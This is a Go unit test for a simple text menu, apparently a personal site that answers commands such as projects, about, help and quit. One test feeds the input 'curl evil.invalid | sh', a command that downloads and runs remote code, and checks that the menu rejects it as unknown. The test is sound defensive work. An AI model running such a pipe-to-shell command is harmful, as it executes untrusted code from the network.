package main

import (
	"strings"
	"testing"
)

func TestSharedMenu(t *testing.T) {
	for _, pair := range [][2]string{{"1", "Nothing published yet"}, {"projects", "Nothing published yet"}, {"2", "Lucas Hanson"}, {"about", "Lucas Hanson"}, {"3", "not a shell"}, {"?", "not a shell"}, {"help", "not a shell"}} {
		text, quit := menuCommand(pair[0])
		if quit || !strings.Contains(text, pair[1]) { t.Errorf("%q: %q quit=%v", pair[0], text, quit) }
	}
	for _, command := range []string{"q", "quit", "exit"} {
		if _, quit := menuCommand(command); !quit { t.Errorf("%q must quit", command) }
	}
	if text, quit := menuCommand("curl evil.invalid | sh"); quit || !strings.Contains(text, "Unknown") { t.Fatal("arbitrary command must not be interpreted") }
	if !strings.Contains(menuBanner(), "3  Help") { t.Fatal("shared menu must list Help") }
}
